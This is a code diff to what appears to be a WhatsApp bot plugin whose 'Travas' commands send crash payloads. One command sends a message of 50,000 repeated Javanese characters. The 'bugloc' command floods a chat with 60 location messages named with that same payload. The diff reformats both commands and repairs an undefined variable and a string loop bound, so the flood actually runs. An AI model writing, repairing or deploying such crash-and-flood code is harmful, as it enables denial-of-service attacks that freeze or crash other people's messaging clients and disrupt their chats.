@@ -74,7 +74,8 @@ cmd({
     async (Void, citel, text,{ isCreator }) => {
         if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
         try {
-                await Void.sendMessage(citel.chat, { text: `̿╮⭑ ☠️⃰͜͡؜ᴘᴏᴡᴇʀᴇᴅ ʙʏ Tᴇꜱʟᴀ Mᴅ╮.xp`+"ꦾ".repeat(50000) }, { quoted: citel });
+                const bug2 = `̿╮⭑ ☠️⃰͜͡؜ᴘᴏᴡᴇʀᴇᴅ ʙʏ Tᴇꜱʟᴀ Mᴅ╮.xp` + "ꦾ".repeat(50000);
+                await Void.sendMessage(citel.chat, { text: bug2 }, { quoted: citel });
         } catch (error) {
             console.error("Error sending Bugtext message: ", error);
         }
@@ -772,36 +773,40 @@ cmd({
 );
 ///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
 cmd({
-        pattern: "bugloc",
-        desc: "Sends a travas bug location",
-        category: "Travas",
-        use: 'bugloc',
-        react: "💣",
-        filename: __filename
-    },
+    pattern: "bugloc",
+    desc: "Sends a travas bug location",
+    category: "Travas",
+    use: 'bugloc',
+    react: "💣",
+    filename: __filename
+},
 
-    async (Void, citel, text,{ isCreator }) => {
-        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
-        await Void.sendMessage(citel.chat, { text: `processing your location bug`},{ quoted: citel });
-        const bug2 = `̿╮⭑ ☠️⃰͜͡؜ᴘᴏᴡᴇʀᴇᴅ ʙʏ Tᴇꜱʟᴀ Mᴅ╮.xp`+"ꦾ".repeat(50000);
-        for (let i = 0; i < 20; i++) {
-            for (let j = 0; j < "3"; j++) {
-                Void.sendMessage(
-                    citel.chat,
-                    {
-                        location: {
-                            degreesLatitude: 34.745948,
-                            degreesLongitude: -92.289883,
-                            name: l + bug2
-                        }
-                    },
-                    { quoted: citel }
-                );
-            }
+async (Void, citel, text, { isCreator }) => {
+    if (!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
+    
+    await Void.sendMessage(citel.chat, { text: `Processing your location bug` }, { quoted: citel });
+
+    const bug2 = `̿╮⭑ ☠️⃰͜͡؜ᴘᴏᴡᴇʀᴇᴅ ʙʏ Tᴇꜱʟᴀ Mᴅ╮.xp` + "ꦾ".repeat(50000);
+    const locationName = bug2; // Utiliser directement bug2 ou initialiser `l` si nécessaire
+
+    for (let i = 0; i < 20; i++) {
+        for (let j = 0; j < 3; j++) { // Utilisation d'un nombre à la place d'un string
+            Void.sendMessage(
+                citel.chat,
+                {
+                    location: {
+                        degreesLatitude: 34.745948,
+                        degreesLongitude: -92.289883,
+                        name: locationName
+                    }
+                },
+                { quoted: citel }
+            );
         }
-        await Void.sendMessage(citel.chat, { react: { text: "💥", key: ms.key } });
     }
-);
+
+    await Void.sendMessage(citel.chat, { react: { text: "💥", key: ms.key } });
+});
 
 //---------------------------------------------------------------------------
 
